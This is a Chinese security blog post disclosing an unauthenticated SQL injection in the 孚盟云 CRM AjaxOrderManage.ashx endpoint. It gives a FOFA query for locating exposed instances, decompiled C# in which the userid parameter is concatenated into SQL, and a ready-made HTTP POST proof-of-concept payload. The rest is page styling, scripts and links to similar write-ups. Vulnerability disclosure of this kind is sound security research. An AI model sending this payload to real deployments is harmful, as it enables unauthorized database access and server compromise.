---
title: "孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOrderManage-sqli.html
asset_dir: assets/孚盟云crm-ajaxordermanage.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/22 08:31
* 264浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

身份验证

网络安全培训

代码安全审计


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxOrderManage.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxOrderManage.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxOrderManage** 方法的实现如下

深入探索

物流软件安全

文本剥离工具

网络安全课程

```
public void ProcessRequest(HttpContext context)
{
  new SqlAndHtmlChecker(context.Request, context.Response).Check();
  context.Response.ContentType = "text/plain";
  string str1 = UserCookie.GetCookieValue("empId");
  if (!string.IsNullOrEmpty(str1))
    str1 = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(str1);
  string str2 = context.Request["action"];
  if (!string.op_Equality(str2, "getsalesfunnel"))
  {
    if (!string.op_Equality(str2, "clickEmp"))
    {
      if (!string.op_Equality(str2, "getfunnel"))
      {
        if (!string.op_Equality(str2, "getCustomerTop"))
        {
          if (!string.op_Equality(str2, "getCustomerFenbu"))
          {
            if (!string.op_Equality(str2, "getEmpxiashu"))
              return;
            this.getEmpxiashu(context, str1);
          }
          else
            this.getCustomerFenbu(context, str1);
        }
        else
          this.getCustomerTop(context, str1);
      }
      else
        this.getfunnel(context, str1);
    }
    else
      this.clickEmp(context, str1);
  }
  else if (context.Request["userid"] != null && string.op_Inequality(context.Request["userid"].ToString(), ""))
    this.getsalesfunnel(context, context.Request["userid"]);
  else
    this.getsalesfunnel(context, str1);
}
```

深入探索

授权

云安全解决方案

Web安全课程

当**action=getsalesfunnel**时，进入`getsalesfunnel`方法

[![孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](images/img-001-75684cefc82b.webp)](https://image.mrxn.net/a7575648512e4e9099279e5bbf4e38c0.webp)

参数**userid**被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

action=clickEmp

代码安全审计

[![孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](images/img-002-ed1058c9686b.webp)](https://image.mrxn.net/013a646c81724f57901febcd8fb54bee.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxOrderManage.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=getsalesfunnel&userid='-1/user--
```

[![孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](images/img-003-cc20f6efc8b6.webp)](https://image.mrxn.net/50ca04cb2a50418b831f549c092b3e9e.webp)

成功通过报错注入在响应回显数数据库用户信息

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOrderManage-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOrderManage-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOrderManage-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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